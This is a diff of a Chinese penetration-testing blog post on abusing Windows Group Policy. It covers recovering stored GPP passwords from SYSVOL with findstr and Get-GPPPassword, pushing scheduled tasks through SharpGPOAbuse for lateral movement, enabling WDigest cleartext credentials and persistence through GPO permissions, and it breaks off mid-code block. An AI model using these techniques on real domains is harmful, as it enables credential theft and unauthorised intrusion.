@@ -27,7 +27,7 @@
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
         <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
 
-    <meta name="author" content="myzxcg" /><meta name="description" content="组策略介绍 组策略可以控制用户帐户和计算机帐户的工作环境，提供了操作系统、应用程序和活……" />
+    <meta name="author" content="myzxcg" /><meta name="description" content="基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
@@ -55,14 +55,14 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2021-09-05T09:09:39+08:00",
-        "dateModified": "2022-01-17T22:42:08+08:00",
+        "dateModified": "2022-04-06T23:36:52+08:00",
         "url": "https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/",
         "headline": "组策略利用与横向移动",
-        "description": "组策略介绍 组策略可以控制用户帐户和计算机帐户的工作环境，提供了操作系统、应用程序和活……",
+        "description": "基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  4279 ,
-        "image": ["https://myzxcg.com/images/image-1630806218.png","https://myzxcg.com/images/image-1630806361.png","https://myzxcg.com/images/image-1630806472.png","https://myzxcg.com/images/image-1630806575.png","https://myzxcg.com/images/image-1630806621.png","https://myzxcg.com/images/image-1630806683.png","https://myzxcg.com/images/image-1630806855.png","https://myzxcg.com/images/image-1630807144.png","https://myzxcg.com/images/image-1630807215.png"],
+        "wordCount":  3635 ,
+        "image": ["https://myzxcg.com/images/16492589190575.jpg","https://myzxcg.com/images/image-1630806472.png","https://myzxcg.com/images/image-1630806575.png","https://myzxcg.com/images/16492591286112.jpg","https://myzxcg.com/images/16492591750446.jpg","https://myzxcg.com/images/image-1630806683.png","https://myzxcg.com/images/image-1630807144.png","https://myzxcg.com/images/image-1630807215.png"],
         "author": {
             "@type": "Person",
             "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
@@ -101,13 +101,13 @@
 
 
 <meta property="og:title" content="组策略利用与横向移动" />
-<meta property="og:description" content="组策略介绍 组策略可以控制用户帐户和计算机帐户的工作环境，提供了操作系统、应用程序和活……" />
+<meta property="og:description" content="基本介绍 组策略提供对域用户、成员机器、应用程序的集中化管理和配置。 组策略可分为本机组……" />
 <meta property="og:url" content="https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" />
 <meta property="og:site_name" content="MYZXCG" />
-<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-1630806218.png" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16492589190575.jpg" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2021-09-05T09:09:39&#43;08:00" />
-    <meta property="article:modified_time" content="2022-01-17T22:42:08&#43;08:00" />
+    <meta property="article:modified_time" content="2022-04-06T23:36:52&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -239,7 +239,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;9&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;8&nbsp;分钟</span>
     
 
    
@@ -253,79 +253,74 @@
 
             <nav class="contents">
   <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
-    <li><a id="contents:组策略介绍" href="#组策略介绍">组策略介绍</a>
+    <li><a id="contents:基本介绍" href="#基本介绍">基本介绍</a></li>
+    <li><a id="contents:gpo-导出与备份" href="#gpo-导出与备份">GPO 导出与备份</a></li>
+    <li><a id="contents:还原组策略中保存的密码" href="#还原组策略中保存的密码">还原组策略中保存的密码</a></li>
+    <li><a id="contents:横向移动" href="#横向移动">横向移动</a></li>
+    <li><a id="contents:权限维持" href="#权限维持">权限维持</a>
       <ol>
-        <li><a id="contents:组策略链接" href="#组策略链接">组策略链接</a></li>
-        <li><a id="contents:组策略内容" href="#组策略内容">组策略内容</a></li>
-        <li><a id="contents:组策略更新" href="#组策略更新">组策略更新</a></li>
-        <li><a id="contents:组策略存储" href="#组策略存储">组策略存储</a></li>
-      </ol>
-    </li>
-    <li><a id="contents:组策略利用" href="#组策略利用">组策略利用</a>
-      <ol>
-        <li><a id="contents:gpo-导出与备份" href="#gpo-导出与备份">GPO 导出与备份</a></li>
-        <li><a id="contents:利用sysvol还原组策略中的密码" href="#利用sysvol还原组策略中的密码">利用SYSVOL还原组策略中的密码</a></li>
-        <li><a id="contents:组策略横向" href="#组策略横向">组策略横向</a></li>
-      </ol>
-    </li>
-    <li><a id="contents:组策略权限维持" href="#组策略权限维持">组策略权限维持</a>
-      <ol>
-        <li><a id="contents:创建gpo的权限" href="#创建gpo的权限">创建GPO的权限</a></li>
-        <li><a id="contents:修改现有的gpo的权限" href="#修改现有的gpo的权限">修改现有的GPO的权限</a></li>
+        <li><a id="contents:添加用户对gpo的权限" href="#添加用户对gpo的权限">添加用户对GPO的权限</a></li>
         <li><a id="contents:seenabledelegationprivilege-特权" href="#seenabledelegationprivilege-特权">SeEnableDelegationPrivilege 特权</a></li>
       </ol>
     </li>
     <li><a id="contents:参考" href="#参考">参考</a></li>
   </ol>
 </nav><div class="post-body e-content">
-                <h2 id="组策略介绍"><a href="#组策略介绍" class="anchor-link">#</a><a href="#contents:组策略介绍" class="headings">组策略介绍</a></h2>
+                <h2 id="基本介绍"><a href="#基本介绍" class="anchor-link">#</a><a href="#contents:基本介绍" class="headings">基本介绍</a></h2>
 <blockquote>
-<p>组策略可以控制用户帐户和计算机帐户的工作环境，提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。</p>
+<p>组策略提供对域用户、成员机器、应用程序的集中化管理和配置。</p>
 </blockquote>
 <p>组策略可分为本机组策略和域的组策略：</p>
 <ul>
 <li>本机组策略用于计算机管理员统一管理本机以及所有用户。</li>
 <li>域内的组策略用于域管统一管理域内的所有计算机以及域用户。</li>
 </ul>
-<h3 id="组策略链接"><a href="#组策略链接" class="anchor-link">#</a><a href="#contents:组策略链接" class="headings">组策略链接</a></h3>
-<p>以<code>Default Domain Policy</code>为例，在右边的作用域里面，可以看到它链接到test.local整个域，也就是说在test.local域内的所有计算机，用户都会受到这条组策略的影响。链接的位置可以是站点、域以及OU。</p>
-<p><img src="/images/image-1630806218.png" alt=""></p>
-<p>比如说财务桌面壁纸这条组策略。它就链接到财务这个OU。加入财务这个OU的所有计算机以及用户会受到影响。</p>
-<p><img src="/images/image-1630806361.png" alt=""></p>
-<h3 id="组策略内容"><a href="#组策略内容" class="anchor-link">#</a><a href="#contents:组策略内容" class="headings">组策略内容</a></h3>
-<p>打开组策略编辑器，可以看到分为计算机配置以及用户配置，分别作用于计算机和用户。</p>
-<p><img src="/images/image-1630806472.png" alt=""></p>
-<p>在配置下又分为策略以及首选项。</p>
-<p>首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。<strong>策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而首选项则是不受管理的、非强制性的。</strong></p>
-<p>对于很多系统设置来说，既可以通过策略设置来实现，也可以通过策略首选项来实现，二者有相当一部分的重叠。</p>
-<h3 id="组策略更新"><a href="#组策略更新" class="anchor-link">#</a><a href="#contents:组策略更新" class="headings">组策略更新</a></h3>
-<p>默认情况下，客户端更新组策略的方式主要有</p>
-<ol>
+<p>打开组策略管理 <code>gpmc.msc</code></p>
+<ul>
 <li>
-<p>后台轮询检查sysvol里的GPT.ini，如果版本高于本地保存的组策略版本，客户端将会更新本地的组策略。轮询的时间是，默认情况下，计算机组策略会在后台每隔 90 分钟更新一次，并将时间作 0 到 30 分钟的随机调整。域控制器上的组策略会每隔 5 分钟更新一次。</p>
+<p><strong>组策略链接</strong></p>
+<p>以Default Domain Policy为例。在右边的作用域里，可以看到它链接到test.local整个域。也就是说在test.local域内的所有计算机、用户都会受到这条组策略的影响。链接的位置可以是域、OU等。</p>
+<p><img src="/images/16492589190575.jpg" alt="">
+注意到图片最下面有一个WMI筛选，此功能是作用于筛选后的指定计算机。比如说作用于所有WIN7的电脑，那么只有WIN7的电脑才会应用此组策略。</p>
 </li>
 <li>
-<p>用户开机登录时会检查sysvol里的GPT.ini，如果高于本地保存的组策略版本，将会更新本地的组策略。</p>
+<p><strong>组策略内容</strong></p>
+<p>打开组策略编辑器，可以看到分为<code>计算机配置</code>以及<code>用户配置</code>，分别作用于计算机和用户。在配置下又分为策略以及首选项。</p>
+<p>首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。<strong>策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而首选项则是不受管理的、非强制性的。</strong></p>
+<p><img src="/images/image-1630806472.png" alt=""></p>
+</li>
+<li>
+<p><strong>组策略更新</strong></p>
+<p>默认情况下，客户端更新组策略有以下几种方式</p>
+<ol>
+<li>
+<p>后台轮询检查域控SYSVOL里每条组策略的GPT.ini，如果高于本地保存的组策略版本，客户端将会更新本地的组策略。默认情况下，计算机组策略会在后台每隔 90 分钟（0-30分钟的抖动）更新一次。域控制器上的组策略会每隔 5 分钟更新一次。</p>
+</li>
+<li>
+<p>用户开机登录时会检查SYSVOL里的GPT.ini。</p>
 </li>
 <li>
 <p>客户端强制更新，执行<code>gpupdate /force</code>。</p>
-<p>域控强制客户端更新（不会比较域共享目录中组策略的版本）执行 <code>Invoke-GPUpdate -Computer &quot;TESTwin10&quot; -Target &quot;User&quot;</code> （2008 R2默认不支持该命令，2012支持）</p>
+<p>域控强制客户端更新<code>Invoke-GPUpdate -Computer &quot;TESTwin10&quot; -Target &quot;User&quot;</code>（不会比较域共享目录中组策略的版本，2008 R2 默认不支持该命令，2012支持）</p>
 </li>
 </ol>
-<p>组策略应用顺序：</p>
-<p>应用本地组策略 →如果有站点组策略则应用→应用域策略→应用OU上的策略。</p>
-<p>如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。如果多个组策略设置冲突，则后应用的组策略覆盖先应用的组策略。</p>
-<h3 id="组策略存储"><a href="#组策略存储" class="anchor-link">#</a><a href="#contents:组策略存储" class="headings">组策略存储</a></h3>
-<p>每条组策略可以看做是存储在域级别的一个虚拟对象，叫做GPO。每个GPO有唯一标志，用来标识每条组策略(或者说每个GPO)，GPO在域内存储分为两个部分：GPC、GPT。</p>
+<p><strong>组策略应用顺序</strong></p>
+<p>本地组策略 →站点组策略→域组策略→OU组策略。</p>
+<p>如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用。后应用的组策略覆盖先应用的组策略。</p>
+</li>
+<li>
+<p><strong>组策略存储</strong></p>
+<p>组策略存储在域控的两个位置中。一条GPO可以认为就是一条组策略。GPO有唯一ID用来标识每条组策略。</p>
 <p><img src="/images/image-1630806575.png" alt=""></p>
-<p>GPC位于LDAP中，<code>CN=Policies,CN=System,&lt;BaseDn&gt;</code>下，每个条目对应一个GPC。包含了GPO属性，例如版本信息，GPO状态和其他组件设置。</p>
-<p><img src="/images/image-1630806621.png" alt=""></p>
-<p>GPT位于<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies</code>中。域内任何人都可以读取<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code>这个默认的共享路径下的内容。</p>
-<p>GPC里面的gPCFileSysPath属性链接到GPT里面。GPT是一个文件系统文件夹，其中包含由.adm文件，安全设置，脚本文件以及有关可用于安装的应用程序的信息指定的策略数据。</p>
-<p>在域、站点、OU上的gPLink属性来标识链接到这里的组策略，gPOptions属性来标识组策略是否会继承。</p>
+<p>在 CN=Policies,CN=System,<BaseDn>下，存储了每个GPO的版本信息、GPO 状态和其他组件设置。</p>
+<p><img src="/images/16492591286112.jpg" alt=""></p>
+<p>在 <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies</code>中（域内任何人都可以读取）保存了每条GPO的安全设置，脚本文件等策略数据。GPO 的<code>gPCFileSysPath</code>属性指向了此路径。
+<img src="/images/16492591750446.jpg" alt=""></p>
+<p>在域、OU上的gPLink属性来标识链接的组策略，gPOptions属性用于标识组策略是否会被继承。</p>
 <p><img src="/images/image-1630806683.png" alt=""></p>
-<h2 id="组策略利用"><a href="#组策略利用" class="anchor-link">#</a><a href="#contents:组策略利用" class="headings">组策略利用</a></h2>
-<h3 id="gpo-导出与备份"><a href="#gpo-导出与备份" class="anchor-link">#</a><a href="#contents:gpo-导出与备份" class="headings">GPO 导出与备份</a></h3>
+</li>
+</ul>
+<h2 id="gpo-导出与备份"><a href="#gpo-导出与备份" class="anchor-link">#</a><a href="#contents:gpo-导出与备份" class="headings">GPO 导出与备份</a></h2>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -352,56 +347,46 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span> <span class="err">–</span><span class="n">verbose</span>
-</span></span><span class="line"><span class="cl"><span class="c">#获得所有GPO的内容</span>
+</span></span><span class="line"><span class="cl"><span class="c">#获得所有GPO名称等基本信息</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span>
 </span></span><span class="line"><span class="cl"><span class="c">#将所有GPO导出为一个HTML报告</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-All</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GposReport</span><span class="p">\</span><span class="n">GposReport</span><span class="p">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-All</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GposReport</span><span class="p">.</span><span class="n">html</span>
 </span></span><span class="line"><span class="cl"><span class="c">#将每个GPO单独导出一个HTML报告</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Get-GPO</span> <span class="n">-All</span> <span class="p">|</span> <span class="p">%{</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-path</span> <span class="p">(</span><span class="s2">&#34;c:\GPOReports\&#34;</span><span class="p">+</span><span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span><span class="p">+</span><span class="s2">&#34;.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPOReport</span> <span class="n">-name</span> <span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span> <span class="n">-ReportType</span> <span class="n">html</span> <span class="n">-path</span> <span class="p">(</span><span class="s2">&#34;c:\&#34;</span><span class="p">+</span><span class="nv">$_</span><span class="p">.</span><span class="n">displayname</span><span class="p">+</span><span class="s2">&#34;.html&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="c">#查看指定GPO的权限设置</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">&#34;客服部组策略&#34;</span> <span class="n">-All</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">Get-GPPermission</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-All</span> 
 </span></span><span class="line"><span class="cl"><span class="c">#备份指定GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span>
 </span></span><span class="line"><span class="cl"><span class="c">#备份所有GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Backup-Gpo</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c">#还原指定GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO1</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">GpoBackups</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-Name</span> <span class="s2">&#34;Default Domain Policy&#34;</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span>
 </span></span><span class="line"><span class="cl"><span class="c">#还原所有GPO</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\GpoBackups&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Restore-GPO</span> <span class="n">-All</span> <span class="n">-Path</span> <span class="s2">&#34;c:\&#34;</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div><h3 id="利用sysvol还原组策略中的密码"><a href="#利用sysvol还原组策略中的密码" class="anchor-link">#</a><a href="#contents:利用sysvol还原组策略中的密码" class="headings">利用SYSVOL还原组策略中的密码</a></h3>
-<p>如果在组策略中输入了密码，如以用户身份运行程序、修改域内主机内置administrator用户密码等操作。</p>
-<p><img src="/images/image-1630806855.png" alt=""></p>
-<p>然后可以在GPT中看到加密后的密码（AES-256），而微软公开了解密私钥。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">C:\Windows\SYSVOL\domain\Policies\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><ol>
+</div><h2 id="还原组策略中保存的密码"><a href="#还原组策略中保存的密码" class="anchor-link">#</a><a href="#contents:还原组策略中保存的密码" class="headings">还原组策略中保存的密码</a></h2>
+<p>如果在组策略中输入了密码，如以用户身份运行计划任务、修改域内主机内置administrator用户密码等。</p>
+<p>可以在SYSVOL下的配置中看到加密后的密码（AES-256），而微软公开了解密密钥。</p>
+<ol>
 <li>
-<p>可以通过以下命令来快速搜索
-<code>findstr /S cpassword \\0day.org\sysvol\*.xml</code></p>
+<p>可以通过以下命令来快速搜索</p>
+<p><code>findstr /S cpassword \\0day.org\sysvol\*.xml</code></p>
 </li>
 <li>
-<p>利用<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">Get-GPPPassword</a>，自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码。</p>
+<p>利用<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">Get-GPPPassword</a>，自动查询SYSVOL中的文件，还原出所有明文密码。</p>
 <p><code>Get-GPPPassword</code></p>
 </li>
 </ol>
-<p><strong>修复：打了补丁KB2962486后，组策略中无法设置用户名密码。</strong></p>
-<h3 id="组策略横向"><a href="#组策略横向" class="anchor-link">#</a><a href="#contents:组策略横向" class="headings">组策略横向</a></h3>
-<p>在拿到域控之后，有时候可能网络ACL到达不了目标电脑，可以通过组策略进行横向。攻击者可以利用组策略来推出恶意软件、创建/修改计划任务、降级凭据保护、向所有计算机添加新的本地帐户被添加到本地管理员组。更改现有的安全策略，启用明文密码提取。</p>
-<ol>
-<li>
-<p>计划任务</p>
-<p>自Windows Server 2008开始，GPO开始支持计划任务，便于管理域中的计算机和用户。</p>
-<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener">指定用户配置定时任务</a></p>
+<p><strong>修复：打了补丁KB2962486后，无法在组策略中设置用户名密码。</strong></p>
+<h2 id="横向移动"><a href="#横向移动" class="anchor-link">#</a><a href="#contents:横向移动" class="headings">横向移动</a></h2>
+<p>拿下域管权限后可能防火墙原因无法访问目标电脑，这时候可以利用组策略进行横向。</p>
+<p>通过组策略来下放恶意软件、创建/修改计划任务、降级凭据保护、向计算机添加新的帐户到本地管理员组、启用明文密码提取等。</p>
+<p><a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener">https://github.com/FSecureLABS/SharpGPOAbuse</a> 、https://github.com/FuzzySecurity/StandIn 实现计划任务、启动脚本、添加本地管理员用户。</p>
+<p><a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener">https://github.com/Hackndo/pyGPOAbuse</a> 可以实现计划任务、添加本地管理员。</p>
+<p><a href="https://github.com/rootSySdk/PowerGPOAbuse" target="_blank" rel="noopener">https://github.com/rootSySdk/PowerGPOAbuse</a> 可以实现的比较全。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -416,84 +401,57 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#加载GroupPolicy模块 （win7没有，win10有）</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">GroupPolicy</span>
-</span></span><span class="line"><span class="cl"><span class="c">#创建一个GPO并将GPO链接到域0day.org，需要域管权限。</span>
-</span></span><span class="line"><span class="cl"><span class="nb">new-gpo</span> <span class="n">-name</span> <span class="n">TestGPO2</span> <span class="p">|</span> <span class="nb">new-gplink</span> <span class="n">-Target</span> <span class="s2">&#34;dc=0day,dc=org&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c">#创建一个GPO并将GPO链接到域test.local，需要域管权限。</span>
+</span></span><span class="line"><span class="cl"><span class="nb">new-gpo</span> <span class="n">-name</span> <span class="n">TestGPO</span> <span class="p">|</span> <span class="nb">new-gplink</span> <span class="n">-Target</span> <span class="s2">&#34;dc=test,dc=local&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="c">#添加定时任务 --TargetDnsName指定计算机</span>
-</span></span><span class="line"><span class="cl"><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;Update2&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;cmd.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&#34;/c calc.exe&#34;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;TestGPO2&#34;</span> <span class="p">-</span><span class="n">-FilterEnabled</span> <span class="p">-</span><span class="n">-TargetDnsName</span> <span class="nb">PC-jack</span><span class="p">-</span><span class="n">0day</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
+</span></span><span class="line"><span class="cl"><span class="n">SharpGPOAbuse</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-AddComputerTask</span> <span class="p">-</span><span class="n">-TaskName</span> <span class="s2">&#34;Update2&#34;</span> <span class="p">-</span><span class="n">-Author</span> <span class="n">DOMAIN</span><span class="p">\</span><span class="n">Admin</span> <span class="p">-</span><span class="n">-Command</span> <span class="s2">&#34;cmd.exe&#34;</span> <span class="p">-</span><span class="n">-Arguments</span> <span class="s2">&#34;/c calc.exe&#34;</span> <span class="p">-</span><span class="n">-GPOName</span> <span class="s2">&#34;TestGPO2&#34;</span> <span class="p">-</span><span class="n">-FilterEnabled</span> <span class="p">-</span><span class="n">-TargetDnsName</span> <span class="nb">PC-jack</span><span class="p">-</span><span class="n">0day</span><span class="p">.</span><span class="n">0day</span><span class="p">.</span><span class="n">org</span>
 </span></span><span class="line"><span class="cl"><span class="c">#删除GPO</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Remove-GPO</span> <span class="n">-Name</span> <span class="n">TestGPO2</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div></li>
-<li>
-<p>在&quot;软件安装&quot;下推出.msi</p>
-</li>
-<li>
-<p>推出特定的启动脚本</p>
-</li>
-<li>
-<p>将域帐户添加到本地管理员RDP组</p>
-</li>
-<li>
-<p>降级凭据保护</p>
-</li>
-<li>
-<p>更改现有的安全策略以启用明文密码提取</p>
-<p>设置<code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</code>下的<code>UseLogonCredentiald</code>值为1</p>
-</li>
-</ol>
-<h2 id="组策略权限维持"><a href="#组策略权限维持" class="anchor-link">#</a><a href="#contents:组策略权限维持" class="headings">组策略权限维持</a></h2>
-<h3 id="创建gpo的权限"><a href="#创建gpo的权限" class="anchor-link">#</a><a href="#contents:创建gpo的权限" class="headings">创建GPO的权限</a></h3>
+</div><p>可以通过cs的<code>execute-assembly</code> 执行。</p>
+<h2 id="权限维持"><a href="#权限维持" class="anchor-link">#</a><a href="#contents:权限维持" class="headings">权限维持</a></h2>
+<h3 id="添加用户对gpo的权限"><a href="#添加用户对gpo的权限" class="anchor-link">#</a><a href="#contents:添加用户对gpo的权限" class="headings">添加用户对GPO的权限</a></h3>
 <p>其实就是对<code>CN=Policies,CN=System,&lt;BaseDn&gt;</code>具备CreateChild的权限。</p>
-<p>查询域内具备创建GPO的权限:</p>
-<p><code>adfind -b CN=Policies,CN=System,DC=0day,DC=org -sddl+++ -s base -sdna -sddlfilter ;;&quot;CR CHILD&quot;;;;</code></p>
-<ol>
-<li>
-<p>添加用户test1对TestGPO的完全访问权限</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$RawObject</span> <span class="p">=</span> <span class="nb">Get-DomainGPO</span> <span class="n">-Raw</span> <span class="n">-Identity</span> <span class="s1">&#39;TestGPO&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查询域内具备创建GPO权限的用户</span>
